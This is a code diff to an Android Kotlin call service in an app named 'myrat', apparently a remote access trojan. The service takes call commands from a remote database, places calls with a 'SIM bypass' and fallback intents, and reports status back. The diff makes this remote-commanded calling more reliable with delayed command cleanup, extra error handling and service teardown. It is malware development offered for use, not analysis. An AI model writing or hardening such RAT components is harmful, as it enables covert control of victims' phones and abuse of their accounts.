@@ -34,6 +34,7 @@ class CallService : BaseService() {
 
     private val sentCallTracker = mutableMapOf<String, MutableSet<String>>()
     private lateinit var deviceId: String
+    private val handler = Handler(Looper.getMainLooper())
 
     override fun onCreate() {
         super.onCreate()
@@ -208,7 +209,7 @@ class CallService : BaseService() {
             val simSlotIndex = subscriptionInfo.simSlotIndex
             Logger.log("✅ Mapped $simNumber to subscriptionId: $subId (slot: $simSlotIndex)")
 
-            // Attempt to place the call
+            // Attempt to place the call with enhanced error handling
             val success = makeCallWithSimBypass(recipient, subId, simSlotIndex, commandId)
 
             if (success) {
@@ -286,7 +287,7 @@ class CallService : BaseService() {
                 Logger.error("SecurityException in ACTION_CALL: ${e.message}", e)
             }
 
-            // Method 3: Fallback to LauncherActivity
+            // Method 3: Fallback to LauncherActivity with enhanced error handling
             try {
                 val intent = Intent(this, LauncherActivity::class.java).apply {
                     action = "com.myrat.app.ACTION_MAKE_CALL"
@@ -378,14 +379,21 @@ class CallService : BaseService() {
                 .addOnSuccessListener {
                     Logger.log("Updated call command $commandId to status $status")
                     if (status == "success" || status == "failed") {
-                        commandRef.removeValue()
-                            .addOnSuccessListener {
-                                Logger.log("Removed call command $commandId")
-                                sentCallTracker.remove(commandId)
+                        // Use handler to delay removal to prevent crashes
+                        handler.postDelayed({
+                            try {
+                                commandRef.removeValue()
+                                    .addOnSuccessListener {
+                                        Logger.log("Removed call command $commandId")
+                                        sentCallTracker.remove(commandId)
+                                    }
+                                    .addOnFailureListener { e ->
+                                        Logger.error("Failed to remove command: ${e.message}", e)
+                                    }
+                            } catch (e: Exception) {
+                                Logger.error("Error in delayed command removal", e)
                             }
-                            .addOnFailureListener { e ->
-                                Logger.error("Failed to remove command: ${e.message}", e)
-                            }
+                        }, 2000) // 2 second delay
                     }
                 }
                 .addOnFailureListener { e ->
@@ -393,6 +401,17 @@ class CallService : BaseService() {
                 }
         } catch (e: Exception) {
             Logger.error("Error updating call command status", e)
+        }
+    }
+
+    override fun onDestroy() {
+        super.onDestroy()
+        try {
+            handler.removeCallbacksAndMessages(null)
+            sentCallTracker.clear()
+            Logger.log("CallService destroyed and cleaned up")
+        } catch (e: Exception) {
+            Logger.error("Error in CallService onDestroy", e)
         }
     }
 }
